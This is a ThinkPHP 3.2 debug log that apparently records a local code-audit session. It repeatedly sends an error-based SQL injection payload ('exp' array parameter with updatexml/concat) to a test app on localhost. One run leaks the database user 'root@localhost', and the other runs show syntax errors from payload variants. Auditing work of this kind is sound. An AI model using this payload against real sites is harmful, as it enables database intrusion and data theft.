INFO: [ app_begin ] --END-- [ RunTime:0.002400s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0250s ]

[ 2019-04-02T20:32:19+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000037s ]
INFO: [ app_init ] --END-- [ RunTime:0.000206s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000588s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000806s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0190s ]

[ 2019-04-02T20:32:41+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
INFO: [ app_init ] --END-- [ RunTime:0.000208s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000712s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001011s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0187s ]

[ 2019-04-02T20:36:44+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000037s ]
INFO: [ app_init ] --END-- [ RunTime:0.000202s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000570s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000845s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0341s ]

[ 2019-04-02T20:41:05+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000037s ]
INFO: [ app_init ] --END-- [ RunTime:0.000203s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001612s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002088s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0376s ]

[ 2019-04-02T20:41:17+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000037s ]
INFO: [ app_init ] --END-- [ RunTime:0.000207s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000670s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000851s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0142s ]

[ 2019-04-02T20:41:25+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000039s ]
INFO: [ app_init ] --END-- [ RunTime:0.000211s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.002240s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002782s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0229s ]

[ 2019-04-02T20:41:31+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000037s ]
INFO: [ app_init ] --END-- [ RunTime:0.000248s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000806s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001022s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0350s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T20:41:42+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000035s ]
INFO: [ app_init ] --END-- [ RunTime:0.000200s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000708s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000900s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0204s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ':='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ':='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T20:45:44+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000037s ]
INFO: [ app_init ] --END-- [ RunTime:0.000221s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000950s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001197s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0348s ]

[ 2019-04-02T20:45:54+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000034s ]
INFO: [ app_init ] --END-- [ RunTime:0.000191s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000569s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000731s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0252s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` 'xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` 'xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T20:46:06+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000077s ]
INFO: [ app_init ] --END-- [ RunTime:0.000335s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001004s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001302s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0236s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ':'xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :'xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ':'xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :'xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T20:50:39+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000041s ]
INFO: [ app_init ] --END-- [ RunTime:0.000220s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000638s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000820s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0300s ]

[ 2019-04-02T20:50:40+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000047s ]
INFO: [ app_init ] --END-- [ RunTime:0.000247s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000613s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000799s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0327s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = : and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = : and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T20:50:53+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000034s ]
INFO: [ app_init ] --END-- [ RunTime:0.000202s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000696s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000915s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0301s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = : and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = : and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T20:51:07+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000035s ]
INFO: [ app_init ] --END-- [ RunTime:0.000198s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000764s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000988s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0341s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': 'and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = : 'and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': 'and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = : 'and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T20:51:20+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000034s ]
INFO: [ app_init ] --END-- [ RunTime:0.000286s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000756s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000952s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0222s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': ''and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = : ''and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': ''and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = : ''and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T20:53:21+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000064s ]
INFO: [ app_init ] --END-- [ RunTime:0.000436s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000815s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001015s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0218s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': 1 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = : 1 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': 1 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = : 1 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T20:53:32+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000036s ]
INFO: [ app_init ] --END-- [ RunTime:0.000196s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000645s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000844s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0325s ]
ERR: :
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :1 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: :
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :1 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T20:53:52+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000041s ]
INFO: [ app_init ] --END-- [ RunTime:0.000252s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001774s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002185s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0300s ]
ERR: :
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :2 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: :
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :2 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T20:54:02+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000064s ]
INFO: [ app_init ] --END-- [ RunTime:0.000250s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000610s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000782s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0327s ]
ERR: :
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: :
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T20:55:05+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000075s ]
INFO: [ app_init ] --END-- [ RunTime:0.000369s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000592s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000764s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0362s ]
ERR: :
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :key and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: :
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :key and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T20:57:10+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000044s ]
INFO: [ app_init ] --END-- [ RunTime:0.000240s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001153s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001819s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0270s ]
ERR: :
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :name and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: :
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :name and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T20:57:22+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000035s ]
INFO: [ app_init ] --END-- [ RunTime:0.000195s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000560s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000721s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0275s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ':'name' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :'name' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ':'name' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :'name' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T20:58:53+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000048s ]
INFO: [ app_init ] --END-- [ RunTime:0.000335s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.002753s ]
